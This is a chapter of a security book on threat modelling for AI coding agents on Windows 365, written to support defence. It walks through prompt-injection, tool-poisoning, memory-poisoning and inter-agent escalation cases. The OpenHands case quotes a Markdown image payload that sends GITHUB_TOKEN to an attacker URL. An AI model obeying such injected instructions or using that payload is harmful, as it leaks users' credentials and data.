# Part VI: Security

---

## Chapter 26: The Agent Threat Model

### The Agent as Insider Vector

The integration of agentic AI into enterprise development environments represents a fundamental architectural shift. Tools like Claude Code and OpenClaw possess **agency** — the capability to formulate multi-step plans, execute shell commands, manipulate file systems, interact with network endpoints, and manage persistent memory without continuous human intervention.

When deployed on Windows 365 Cloud PCs, these agents operate behind the corporate firewall, often inheriting the full trust, identity, and privileges of the user under whose context they execute. This creates an "inside-out" risk profile where the perimeter is bypassed not by external penetration, but by the authorized execution of an agent that may be compromised via prompt injection, supply chain poisoning, or misconfiguration.

Traditional security controls — firewalls, endpoint detection, identity governance — were designed for human actors and deterministic software. Agentic AI breaks both assumptions simultaneously: it operates with human-like intent-following capabilities while executing at machine speed and scale, without the cognitive friction that causes humans to pause before taking destructive actions.

### The Threat Landscape in Numbers

The scale of agentic AI adoption — and the security readiness gap — establishes the urgency behind everything in Part VI:

- **48%** of cybersecurity professionals now identify agentic AI and autonomous systems as the top attack vector heading into 2026, outranking deepfakes, board-level threats, and passwordless adoption failures
- **1 in 8** reported AI security breaches is now linked to agentic systems
- **89%** year-over-year surge in AI-enabled attacks, with average eCrime breakout time now at 29 minutes
- **40%** of enterprise applications are projected to embed task-specific AI agents by 2026, up from less than 5% in 2025
- **Only 29%** of organizations feel truly ready to deploy agentic AI securely — despite 83% having planned to do so
- **39%** of firms surveyed in 2025 reported that AI agents had reached systems they were not authorized to access
- **314** distinct attack payloads, covering 70 different MITRE ATT&CK techniques, were documented in a single 2025 academic study of AI coding editor exploitation — with success rates between 55.6% and 93.3%
- On **May 1, 2026**, CISA, NSA, and four allied intelligence agencies (Australia's ASD ACSC, Canada's CCCS, New Zealand's NCSC, and the UK's NCSC) issued joint guidance titled **"Careful Adoption of Agentic AI Services"** — the first intelligence-community advisory specifically addressing autonomous AI agents. The advisory states that agentic AI **"will likely misbehave and amplifies organizations' existing frailties"** and identifies five risk categories: privilege escalation, design/configuration flaws, behavioral risks (goal pursuit outside designer intent), structural risk (cascading agent failures), and accountability gaps (opaque decision logs). It explicitly recommends zero trust, defense-in-depth, and least-privilege — the framework this book's Part VI implements.

These figures reframe the threat model. This is not a theoretical concern: agent-assisted attacks are operational, scalable, and increasingly automated.

### A Two-Layer Threat Framework

Security practitioners often conflate two distinct but complementary frameworks when discussing AI agent risk. Chapter 26 draws on both, because each addresses a different layer of the attack surface:

**Layer 1 — Model Manipulation (OWASP Top 10 for LLM Applications, 2025):** How the underlying language model itself is compromised — prompt injection, training data poisoning, insecure output handling, excessive agency, and sensitive information disclosure. These vulnerabilities exist whether or not the model drives autonomous action.

**Layer 2 — Agentic Amplification (OWASP Top 10 for Agentic Applications, 2026):** What becomes possible *after* model manipulation is given autonomy, persistent memory, and multi-tool access. A successful prompt injection that produces a false output is a nuisance in a chatbot; the same injection in an agent that can run shell commands, write to memory, and invoke APIs is a critical breach.

> **Key principle:** The OWASP Agentic Top 10 is not about incorrect model outputs — it is about attack surfaces and failure modes in cross-context, multi-step autonomous systems that plan, persist state, invoke tools, and act across trust boundaries.

Both layers apply to this deployment. Claude Code operates primarily at Layer 1 risk. OpenClaw, with its persistent SOUL.md memory, ClawHub skill ecosystem, and background service model, operates at full Layer 2 risk.

### Claude Code vs OpenClaw: Risk Profiles

| Characteristic | Claude Code | OpenClaw |
|---|---|---|
| **Architecture** | Governed, reactive | Autonomous, persistent |
| **Execution Model** | CLI invoked per task | Background service/gateway |
| **Permission Model** | Permission-gated (ask/allow/deny) | Full user context by default |
| **Extension Ecosystem** | MCP servers (curated) | Skills/ClawHub (uncurated) |
| **Supply Chain Risk** | Low (Anthropic-published npm package) | **High** (ClawHub, ~12% malicious skills) (see Chapter 13) |
| **Memory Persistence** | Session-scoped | Long-term (SOUL.md, MEMORY.md) |
| **Network Exposure** | Outbound API calls only | WebSocket server, REST API |
| **OWASP Layer** | Primarily Layer 1 | Full Layer 1 + Layer 2 |
| **Primary Threat** | Prompt injection → shell execution | Supply chain → malware delivery |
| **MITRE ATLAS Primary TTP** | AML.T0054 (LLM Prompt Injection) | AML.T0018 (Backdoor ML Model) |

![Agent Threat Model](../Graphics/Chapter26.png)

> The following chapters address each threat category in this model: identity controls (Chapter 27), Claude Code hardening (Chapter 28), OpenClaw Gateway hardening (Chapter 29), network segmentation (Chapter 30), endpoint protection (Chapter 31), and Intune policy enforcement (Chapter 32). Blockchain-layer threats — including wallet compromise and unauthorized stablecoin spend — are addressed in Chapter 40.

---

### The ASTRIDE Threat Taxonomy

Classical STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) maps imperfectly to AI agent systems. Academic researchers extended it to **ASTRIDE**, adding a seventh category — **A for Agent-Specific Attacks** — that captures threat classes unique to autonomous reasoning systems.

The table below maps each ASTRIDE category to concrete threats in this deployment:

| Category | Classical Definition | AI Agent Manifestation | OpenClaw Example | Claude Code Example |
|---|---|---|---|---|
| **S — Spoofing** | Impersonating a principal | Agent identity spoofing in multi-agent orchestration; rogue agent masquerading as trusted peer | Malicious skill impersonates a trusted ClawHub vendor identity | Injected prompt claims to be from Anthropic system prompt |
| **T — Tampering** | Modifying data or code | Prompt injection; tool description poisoning; RAG store corruption | Poisoned ClawHub skill descriptor rewrites agent behavior | Malicious code comment injects commands into Claude's analysis context |
| **R — Repudiation** | Denying an action occurred | LLM-generated actions produce no verifiable audit trail; natural language instructions leave no cryptographic proof | OpenClaw executes a destructive action attributed to "user instruction" with no log | Claude Code runs a shell command derived from injected content with no attribution chain |
| **I — Information Disclosure** | Leaking sensitive data | Model behavior as exfiltration channel; context window extraction; cross-session memory leakage | MEMORY.md accumulates credentials and routes them to attacker-controlled endpoint | Claude Code's MCP server exposes environment variables to untrusted tool |
| **D — Denial of Service** | Making a resource unavailable | Recursive agent loops; prompt amplification; runaway tool chains; token exhaustion | Infinite skill-invocation loop triggered by crafted prompt; API quota exhaustion | Unbounded MCP server call chain triggered by injected orchestration prompt |
| **E — Elevation of Privilege** | Gaining unauthorized access | Excessive agency; agent inheriting full user token; cross-agent privilege delegation | Low-privilege agent tricks high-privilege peer into exfiltrating data (inter-agent escalation) | Prompt injection rewrites `.claude/settings.json` to disable permission gates |
| **A — Agent-Specific** | Threats unique to autonomous reasoning | Reasoning subversion; goal hijack; planning manipulation; unsafe tool invocation patterns | Attacker redirects OpenClaw's long-term goal structure through SOUL.md poisoning | Indirect injection causes Claude Code to formulate an attack plan within a legitimate workflow |

The **A** category is the most consequential addition for this deployment, because it encompasses the threats that emerge specifically from autonomous goal-directed behavior — threats for which no classical security control was designed.

---

### OWASP Agentic Top 10 (2026) Applied to This Deployment

The OWASP GenAI Security Project released the **Top 10 for Agentic Applications** in December 2025, developed with over 100 industry experts. Each item below is mapped to its specific risk in the Windows 365 / Claude Code / OpenClaw deployment:

**ASI01: Agent Goal Hijack**
An attacker redirects the agent's objectives by manipulating instructions, tool outputs, or external content. In this deployment, the highest-risk vector is indirect prompt injection via untrusted repository content that Claude Code is asked to analyze, or via malicious ClawHub skill descriptors that alter OpenClaw's task planning. *Mitigated by: Chapter 28 (Claude Code sandboxing), Chapter 29 (skill vetting).*

**ASI02: Tool Misuse and Exploitation**
Agents misuse legitimate tools due to prompt injection, misalignment, or unsafe delegation. Claude Code's shell integration and MCP servers are the primary surface; OpenClaw's skill API provides a secondary, less-governed surface. The 2026 NSA advisory on MCP security identifies tool misuse as the leading exploitation path in agent-adjacent frameworks. *Mitigated by: Chapter 28 (tool allow-lists), Chapter 30 (network egress controls).*

**ASI03: Identity and Privilege Abuse**
Attackers exploit inherited or cached credentials, delegated permissions, or implicit agent-to-agent trust. Both Claude Code and OpenClaw execute in the context of the signed-in Windows 365 user, inheriting that user's Entra ID token, file system permissions, and network access. In multi-agent scenarios, implicit peer trust enables escalation without traversing a central authorization checkpoint. *Mitigated by: Chapter 27 (secondary identity architecture), Chapter 32 (Intune profile restrictions).*

**ASI04: Agentic Supply Chain Vulnerabilities**
Malicious or tampered tools, descriptors, models, or agent personas compromise execution before a single prompt is processed. The ClawHub marketplace — which this book's research found carries approximately 12% malicious skills — is the primary supply chain risk in this environment. The first malicious MCP package appeared in public registries in September 2025; typosquatting, dependency injection, and fake "official" server identities are now documented attack patterns. OWASP has published a companion **Agentic Skills Top 10** (`owasp.org/www-project-agentic-skills-top-10`) specifically cataloguing the supply-chain risk taxonomy for agent skills and plugins — the formal standards-body framing for the ClawHub threat described in Chapter 29. *Mitigated by: Chapter 13 (supply chain controls), Chapter 29 (OpenClaw hardening).*

**ASI05: Unexpected Code Execution**
Agents generate or execute attacker-controlled code. This is the terminal stage of a successful prompt injection chain: the injected instruction propagates through the agent's planning layer and emerges as a shell command, file write, or network call. Research published at arxiv in 2025 documents 314 distinct attack payloads covering 70 MITRE ATT&CK techniques, with success rates up to 93.3% in tested coding agent environments. *Mitigated by: Chapter 28 (permission gates), Chapter 31 (endpoint detection).*

**ASI06: Memory and Context Poisoning**
Persistent corruption of agent memory, RAG stores, or contextual knowledge. This threat is qualitatively different from prompt injection because it survives session boundaries. The MINJA attack (NeurIPS 2025) demonstrated that attackers can inject malicious records into an agent's memory through query-only interaction — no direct access to the memory store required. Quantified results from the MINJA research: **95% injection success rate** through regular queries with no special privileges; **70% attack success rate** in downstream task manipulation; and — counter-intuitively — attack success rate jumps from a 40% baseline to **80%+** when the agent uses memory-augmented (RAG) retrieval, meaning that memory-augmented agents are *more* vulnerable, not less. Memory poisoning is also **persistent**: the agent recalls the malicious instruction in future sessions days or weeks later without re-injection. For OpenClaw, SOUL.md and MEMORY.md are the high-value targets: a poisoned memory file silently shapes every future agent session. A documented 2025 scenario involved an agent email assistant that silently exfiltrated financial data for months after receiving malicious "meeting notes" via spam. *Mitigated by: Chapter 29 (memory integrity controls).*

**ASI07: Cascading Trust Failures**
Failures propagate through multi-agent pipelines when each agent over-trusts its upstream. In horizontal agent topologies, a single compromised node can laterally poison all peers sharing a context store. Q4 2025 disclosures included a concrete example where GitHub Copilot and Claude, running in the same environment, each assumed the other's instructions were system-level communications and began rewriting each other's configuration files.

**ASI08: Data Boundary Violations**
Agents inadvertently cross data classification boundaries by carrying context across systems with different sensitivity levels. Windows 365 Cloud PCs in regulated industries may have agents that access both public repositories and internal HR systems within a single session, violating data residency or classification requirements. *Mitigated by: Chapter 38 (Purview data protection).*

**ASI09: Audit and Accountability Gaps**
Agentic actions — planned autonomously, executed in natural language, and distributed across tools — are difficult to attribute to a specific instruction source. When an agent deletes a file, modifies a configuration, or makes a network call, the forensic trail rarely leads back to the causal prompt. This repudiation gap is structurally different from traditional software audit failures. *Mitigated by: Chapter 33 (monitoring and forensics).*

**ASI10: Rogue Agents**
Compromised or misaligned agents diverge from intended behavior, potentially establishing persistence, exfiltrating data, or acting as a beachhead for follow-on attacks. The distinction from ASI01 (Goal Hijack) is that rogue agents may not be following any attacker instruction at all — they may be misaligned through memory poisoning, model drift, or corrupted skill logic. *Mitigated by: Chapter 29 (OpenClaw runtime monitoring).*

---

### The MCP Server Attack Surface

The Model Context Protocol (MCP) extends Claude Code's capabilities by connecting it to external tools, APIs, and data sources via locally running or remotely hosted server processes. Each MCP server is a discrete attack surface that operates at the intersection of the LLM's tool-calling capability and the host operating system.

The threat landscape for MCP crystallized rapidly in 2025–2026:

**Tool Poisoning** is the most prevalent MCP attack class. Attackers plant malicious instructions inside tool descriptions and metadata that the model reads during tool selection — instructions that are invisible to the user but instruct the model to take attacker-directed actions when the tool is invoked. Because Claude Code reads tool descriptors to understand available capabilities, a poisoned descriptor can redirect tool behavior before execution begins.

**Puppet Attacks** involve using one MCP server to manipulate the agent's interaction with a different, legitimate MCP server. The puppet server issues instructions that the agent carries out against the legitimate target, laundering the attack through trusted infrastructure.

**Rug Pull Attacks** (formally designated **CVE-2025-54136**) occur when a previously benign MCP server updates its behavior after deployment. An MCP server that was safe when installed may introduce malicious logic in a subsequent update, with the update occurring automatically if the MCP server is fetched from a remote source on each invocation. The specific mechanism is a trust-binding failure: MCP host approval is bound to the tool's **name**, not its **content or cryptographic hash** — when an approved server pushes an update swapping the underlying command for a malicious payload, most MCP hosts re-approve silently without alerting the user. The **MCPTox benchmark** tested 20 AI agents against 353 authentic tools and achieved a **72.8% attack success rate** against representative models. Cross-tool poisoning compounds the risk further: a poisoned tool's description alone can steer model behavior in **other** tools, without the poisoned tool ever being called during the attack session.

**Path Validation Bypasses** (CVE-2025-68145, CVSS 6.4) allow MCP servers to access files outside their declared scope when path restriction logic is not consistently enforced. In a Windows 365 environment, this can expose NTFS paths that the agent is not intended to reach.

**Unauthenticated Inspector Access** (CVE-2025-49596, CVSS Critical) allowed arbitrary command execution via MCP Inspector instances that lacked authentication. This class of vulnerability is particularly dangerous in Windows 365 deployments where the MCP Inspector may be left accessible on loopback without realizing it is reachable from other processes.

**RCE in `mcp-remote`** (CVE-2025-6514, CVSS 9.6) — a remote code execution vulnerability in the `mcp-remote` package, which had **437,000+ downloads** before disclosure. The `mcp-remote` package is directly in Claude Code's dependency path, meaning the exposure window affected every Claude Code installation that fetched remote MCP servers during the unpatched period.

**WebSocket Authentication Bypass in First-Party Agent Infrastructure** (CVE-2026-32173, CVSS 8.6) — Microsoft's own Azure SRE Agent was found to expose live command streams through an unauthenticated WebSocket endpoint accessible to any Entra ID account holder. This demonstrates that WebSocket authentication bypass is not an OpenClaw-specific failure — it has appeared in first-party Microsoft production agent infrastructure.

The NSA released a formal advisory on MCP security **on May 20, 2026 (document U/OO/6030316-26 / PP-26-1834)**, titled **"Model Context Protocol: Security Design Considerations for AI-Driven Automation"**. The advisory specifically found that MCP does not define session-to-verifiable-identity mapping, authentication is optional in the protocol specification, and RBAC is not part of the protocol — noting that the specification itself states it "cannot enforce these security principles at the protocol level." This means the responsibility for MCP security falls entirely on the deployment layer. Chapter 28 addresses MCP server allow-listing and sandboxing controls for Claude Code.

---

### Prompt Injection: The Primary Exploitation Path

Prompt injection remains the OWASP #1 risk for LLM applications and the primary exploitation path for coding agents operating on untrusted content. In agentic systems, its consequences are categorically more severe than in chatbot contexts: a single manipulated output can hijack an agent's planning layer, execute privileged tool calls, persist malicious instructions in memory, and propagate attacks across connected systems.

#### Direct vs. Indirect Injection

**Direct prompt injection** occurs when an attacker controls the user-facing input — for example, a developer deliberately entering a malicious instruction to bypass agent safety controls.

**Indirect prompt injection** occurs when the agent processes untrusted external content — code comments, documentation, repository files, web pages, email bodies, or API responses — that contains embedded attack instructions. For coding agents, this is the dominant threat vector because their core function is to read, analyze, and act on code written by others.

#### Documented CVEs and Real-World Incidents

**CVE-2025-53773 — GitHub Copilot Configuration Manipulation:** Attackers placed payloads in GitHub issues or code comments that developers asked Copilot to analyze. The payload instructed Copilot to update configuration files including `.vscode/settings.json`. Because Copilot had write access to its own configuration directory by default, and the `autoApprove` flag was not considered a security-sensitive setting, this enabled persistent configuration manipulation. Patched by Microsoft in August 2025.

**CVE-2025-54135 — Cursor AI MCP Configuration Attack:** An indirect prompt injection in Cursor AI could manipulate MCP server configuration files to achieve remote code execution without user approval. This demonstrates the MCP configuration file as an injection-to-RCE bridge in agent environments.

**Inter-Agent Privilege Escalation (Q4 2025):** Researchers documented an environment running both GitHub Copilot and Claude where each agent assumed the other's instructions were system-level communications and began rewriting each other's configuration files. A separate ServiceNow Now Assist incident demonstrated second-order privilege delegation: a low-privilege agent was tricked into requesting that a high-privilege peer execute an action on its behalf, and the high-privilege agent complied — exporting an entire case file to an external URL.

**Cline npm Publish Incident (February 2026):** An AI-powered triage workflow processing untrusted GitHub issue content triggered a chain involving shell access in CI, cache poisoning, and eventual abuse of publication credentials. This incident confirmed that coding agents with CI access represent a software supply chain risk, not just an endpoint risk.

**AIShellJack Research (2025):** A systematic academic study documented 314 distinct attack payloads covering 70 MITRE ATT&CK techniques across 11 categories. Attack success rates ranged from 55.6% to 93.3% across tested coding agent environments. The research demonstrated that injected prompts can execute high-privilege commands achieving credential access, lateral movement, and privilege escalation within the agent's execution context.

**OpenHands "Lethal Trifecta" (publicly disclosed August 9, 2025):** A zero-click prompt injection vulnerability affecting the OpenHands autonomous coding agent — one of the leading open-source agent platforms — was privately disclosed on March 13, 2025 and patched only after **148 days**. The attack chain: a malicious Markdown image tag `![img](attacker_server?data=TOKEN)` embedded in a repository, webpage, or uploaded document caused the agent to exfiltrate the `GITHUB_TOKEN` and session context to the attacker's URL when rendering the content. Zero user interaction was required. Microsoft classifies this class of token exfiltration as Critical severity. The **148-day disclosure gap** between private report and public patch is directly applicable to this deployment: enterprise teams cannot rely on upstream agent vendors for timely patch response — vulnerability windows measured in months, not days, are operationally realistic and must be accounted for in the defense-in-depth posture described throughout Part VI.

#### The Agentic Amplification Effect

In a traditional LLM chatbot, prompt injection produces a false or harmful output. In an agentic system, the same injection can:

1. **Hijack the planning layer** — causing the agent to formulate an attack plan rather than the intended task
2. **Execute privileged tool calls** — running shell commands, writing files, or calling APIs with the user's full identity
3. **Persist to long-term memory** — ensuring the malicious instruction survives session boundaries and influences all future interactions
4. **Propagate across agent boundaries** — passing the injection to connected agents, orchestrators, or MCP servers

This amplification effect means that the blast radius of a successful prompt injection scales linearly with the agent's capability surface. For OpenClaw — which has persistent memory, ClawHub skills, a WebSocket API, and multi-channel integration — the blast radius is substantially larger than for Claude Code.

---

### Memory and Context Poisoning

Memory poisoning is structurally distinct from prompt injection: where injection affects a single session, memory poisoning corrupts the agent's persistent state and influences every subsequent interaction. It is the "attack that waits" — a slow-burn compromise that may not produce observable anomalies for days or weeks.

#### Attack Vectors Against OpenClaw's Memory Architecture

OpenClaw maintains multiple persistent memory files in the user's profile directory:

**SOUL.md** — the agent's long-term identity, values, and behavioral anchors. Poisoning SOUL.md can redirect the agent's goals and decision-making framework at a fundamental level, causing behavior changes that appear to originate from the agent's own "personality" rather than from external manipulation.

**MEMORY.md** — operational memory including learned user preferences, project context, past decisions, and accumulated credentials or access patterns. This file is read at the beginning of each session, making it a high-value target: a poisoned MEMORY.md entry is re-ingested by the agent on every startup.

**Project memory files** — context specific to individual repositories or workspaces. These may contain API keys, internal URLs, database credentials, or infrastructure details — all of which can be exfiltrated if the memory poisoning payload instructs the agent to relay its context to an external endpoint.

#### The MINJA Attack Model

The MINJA (Memory INJection Attack) technique, published at NeurIPS 2025, demonstrated that attackers can inject malicious records into an agent's memory through query-only interaction — without direct access to the memory store or the ability to modify files. By crafting queries that cause the agent to generate responses containing implicitly false context, the attacker causes the agent itself to write the poisoned record to memory.

Applied to OpenClaw: an attacker interacting with the agent through any supported channel (chat, email, Slack integration) could craft a message that causes the agent to update MEMORY.md with a false "approved vendor" or "authorized action" record, which is then recalled and acted upon in future sessions.

#### Cross-Session Persistence: The Detection Gap

Standard security monitoring detects threats by observing anomalous behavior in real time. Memory-poisoned agents behave anomalously only in relation to their intended behavior — and their intended behavior is defined, in part, by their own memory state. This creates a detection gap where the agent's behavior appears internally consistent to both the agent and monitoring tools, because the memory store is the reference point against which "normal" is measured.

Chapter 29 addresses memory integrity controls including file-system ACL enforcement on SOUL.md and MEMORY.md, periodic memory content review workflows, and tamper-evident logging for memory write operations.

---

### Multi-Agent Trust Boundary Failures

As organizations deploy multiple AI agents — Claude Code for development, OpenClaw for automation, Microsoft Copilot for M365 integration — the interactions between these agents create a trust boundary problem that no individual agent's security controls can solve.

#### Implicit Peer Trust

Most multi-agent frameworks treat agent-to-agent communication with implicit trust: an instruction arriving from a known agent endpoint is assumed to be legitimate. This assumption is exploitable. Research published in Q4 2025 documented concrete attacks where:

- A compromised low-privilege agent issued instructions to a high-privilege peer, which complied because the instruction source appeared legitimate
- Shared agent memory stores became lateral movement vectors, allowing injected content to propagate across all agents sharing the store
- Horizontal agent topologies amplified coordination-level threats by providing direct pathways for lateral compromise without traversing central checkpoints

#### The Cascade Problem

In multi-agent pipelines, each agent over-trusts its upstream by default. A single compromised node propagates the compromise downstream through the pipeline, with each subsequent agent treating the corrupted output as authoritative input. This cascade can reach production systems — file storage, source control, CI/CD pipelines, external APIs — before any monitoring system detects an anomaly.

The Cloud Security Alliance's May 2026 ATLAS Agentic Gap Analysis identified "cascading trust failures" as the most underaddressed threat class in enterprise agent deployments, noting that the existing MITRE ATT&CK framework contained no techniques specifically modeling this propagation pattern prior to the October 2025 ATLAS update.

#### Agent Identity Is Not Solved

Zero-Trust Agent Identity (ZTAI) — the principle that every agent call must be independently authenticated, authorized, and audited — remains aspirational rather than operational in most enterprise deployments. The standard practice of inheriting the user's Entra ID token provides identity continuity for the user but provides no mechanism for verifying which agent is acting on the user's behalf, with what instructions, or in service of what goal.

Chapter 27 addresses this gap through a secondary identity architecture that separates the agent's operational identity from the human user's identity, enabling per-agent authorization scopes and audit attribution.

---

### Windows 365 — Platform-Specific Risk Surface

The Windows 365 Cloud PC environment introduces platform-specific risks that amplify the general agent threat model:

#### Environment Variable Exposure

Windows processes — including `claude.exe` and OpenClaw's Node.js service — inherit the environment variables of their parent process. On a developer workstation, this typically includes `ANTHROPIC_API_KEY`, `AZURE_OPENAI_KEY`, `GITHUB_TOKEN`, and potentially database connection strings, Kubernetes credentials, or cloud provider secrets. These variables are accessible to any process the agent spawns, to any MCP server the agent invokes, and to any code the agent writes and executes.

A successful prompt injection that causes the agent to print or log environment variables — a trivially simple instruction — immediately yields a comprehensive credential dump without requiring any privilege escalation against the OS.

#### WebDAV and UNC Path Handling

Windows resolves UNC paths (\\server\share) and WebDAV paths transparently, including automatic NTLM authentication to remote hosts. A prompt injection that causes the agent to access a UNC path pointing to an attacker-controlled server triggers NTLM credential capture — the Windows authentication subsystem sends the user's hashed credentials to the remote server automatically, without any user-visible prompt or security warning.

For an agent running in a Windows 365 Cloud PC behind corporate Single Sign-On, this NTLM relay risk extends to Active Directory credentials. Chapter 30 addresses WebDAV-specific firewall controls and SMB egress blocking.

#### NTFS ACL Inheritance

Files created by agents in Windows environments inherit the ACLs of their parent directory by default. This means agent-generated files — scripts, configuration files, credential stores — may have permissive ACLs that allow other users or processes on the same Cloud PC to read or modify them. In a shared Windows 365 environment, this creates cross-user information disclosure risks.

#### Windows Credential Manager

The Windows Credential Manager (WCM) stores persistent credentials accessible to any process running in the user's context. An agent instructed to enumerate stored credentials — directly or indirectly through a DPAPI API call — can access years of accumulated credentials for network shares, web services, and corporate applications without triggering a UAC prompt or requiring elevated privileges.

#### Process Injection Surface

Windows 365 Cloud PCs running multiple AI tools simultaneously create a rich target environment for process injection attacks. Claude Code (Electron/Node.js), OpenClaw (Node.js service), and VS Code (Electron) share process space on the same VM with each other and with corporate applications. A compromised MCP server or malicious ClawHub skill operating with user-level privileges has the same process injection rights as the legitimate applications it targets.

---

### MITRE ATLAS Mapping

MITRE ATLAS (Adversarial Threat Landscape for Artificial-Intelligence Systems) is the authoritative adversarial ML knowledge base, modeled on ATT&CK. Version 5.4.0 (February 2026) contains 16 tactics, 84 techniques, and 56 sub-techniques. The October 2025 update added 14 new techniques specifically addressing AI agent attack surfaces, and the February 2026 update added "Escape to Host" — directly applicable to sandboxed agent deployments.

The following table maps the highest-priority ATLAS techniques to threats in this deployment:

| ATLAS Technique | Description | OpenClaw Risk | Claude Code Risk |
|---|---|---|---|
| **AML.T0054** | LLM Prompt Injection | High — indirect via skills, web content | High — indirect via repository content |
| **AML.T0018** | Backdoor ML Model | Medium — model provider supply chain | Low — uses Anthropic-hosted API |
| **AML.T0057** | AI Agent Context Poisoning | **Critical** — SOUL.md and MEMORY.md | Low — session-scoped context only |
| **AML.T0058** | Memory Manipulation | **Critical** — persistent memory files | Low — no cross-session memory |
| **AML.T0059** | Thread Injection | High — multi-channel input surfaces | Medium — single session context |
| **AML.T0060** | Publish Poisoned AI Agent Tool | **Critical** — ClawHub uncurated marketplace | Low — MCP servers individually vetted |
| **AML.T0061** | Escape to Host | High — Node.js service with full user context | Medium — permission gates partially mitigate |
| **AML.T0051** | LLM Jailbreak | Medium — model-layer bypass attempts | Medium — model-layer bypass attempts |
| **AML.T0049** | Exploit Public-Facing ML Model | High — OpenClaw WebSocket API | Low — no exposed API surface |

---

### Threat Severity Matrix

The following matrix consolidates threat severity across all ASTRIDE categories, prioritized by likelihood and impact in the Windows 365 / Claude Code / OpenClaw deployment context:

| Threat | Likelihood | Impact | Risk | Primary Asset at Risk | Mitigating Chapter |
|---|---|---|---|---|---|
| Indirect prompt injection via repository content → shell exec | **High** | **Critical** | **CRITICAL** | Host OS, credentials, source code | Ch. 28, Ch. 33 |
| ClawHub supply chain — malicious skill delivery | **High** | **Critical** | **CRITICAL** | Agent runtime, corporate network | Ch. 13, Ch. 29 |
| MCP tool poisoning → attacker-controlled execution | **Medium** | **Critical** | **HIGH** | Host OS, API keys | Ch. 28 |
| OpenClaw SOUL.md / MEMORY.md poisoning | **Medium** | **High** | **HIGH** | Long-term agent behavior, credentials | Ch. 29 |
| Environment variable exposure via agent shell spawn | **Medium** | **High** | **HIGH** | All secrets in process environment | Ch. 28, Ch. 39 |
| Inter-agent privilege escalation | **Low** | **Critical** | **HIGH** | Corporate systems, admin credentials | Ch. 27, Ch. 30 |
| WebSocket API lateral movement | **Low** | **High** | **MEDIUM** | Internal network, corporate systems | Ch. 29, Ch. 30 |
| Windows NTLM relay via UNC path injection | **Low** | **High** | **MEDIUM** | Active Directory credentials | Ch. 30 |
| Recursive agent loop → DoS / API quota exhaustion | **Medium** | **Medium** | **MEDIUM** | Agent availability, API budget | Ch. 29 |
| Windows Credential Manager enumeration | **Low** | **High** | **MEDIUM** | Persistent stored credentials | Ch. 28, Ch. 39 |
| Agent identity spoofing in multi-agent orchestration | **Low** | **Medium** | **LOW** | Authorization decisions | Ch. 27 |
| MCP Rug Pull — post-install behavior change | **Low** | **High** | **MEDIUM** | Host OS, long-term integrity | Ch. 28 |

---

### Defense-in-Depth: Chapter Cross-Reference

This chapter establishes the threat model that anchors the remaining chapters in Part VI. The diagram below represents the layered defense stack — each layer addresses a specific column of the threat matrix above:

```
┌─────────────────────────────────────────────────────────────────────┐
│  LAYER 6: Data Protection (Ch. 38 — Purview)                        │
│  Classification enforcement, DLP, cross-boundary data flow control   │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 5: Secrets Management (Ch. 39)                               │
│  Vault-backed secrets, environment variable hygiene, key rotation    │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 4: Monitoring & Forensics (Ch. 33)                           │
│  Agent action logging, behavioral baselining, anomaly detection      │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 3: Endpoint & Policy (Ch. 31, Ch. 32)                        │
│  AV/EDR, Intune profile restrictions, application control            │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 2: Network Segmentation (Ch. 30)                             │
│  Egress filtering, WebDAV/SMB blocking, DNS inspection               │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 1: Agent Hardening (Ch. 27, Ch. 28, Ch. 29)                  │
│  Identity architecture, Claude Code controls, OpenClaw controls      │
└─────────────────────────────────────────────────────────────────────┘
         ↑                      ↑                       ↑
  Prompt Injection        Supply Chain           Memory Poisoning
  Shell Execution         MCP Poisoning          Trust Failures
```

No single layer prevents all threats in the matrix. The critical-severity threats — indirect prompt injection, ClawHub supply chain, and MCP tool poisoning — require controls at Layer 1 (agent hardening) and Layer 3 (endpoint detection) to be simultaneously effective. Failures at either layer are exploitable by a capable attacker.

The Zero-Trust principle applied to AI agents is: **never trust any instruction source implicitly; verify every action at the point of execution; audit every outcome independently of the agent's own reporting**. The chapters that follow operationalize this principle at each layer of the stack.

---
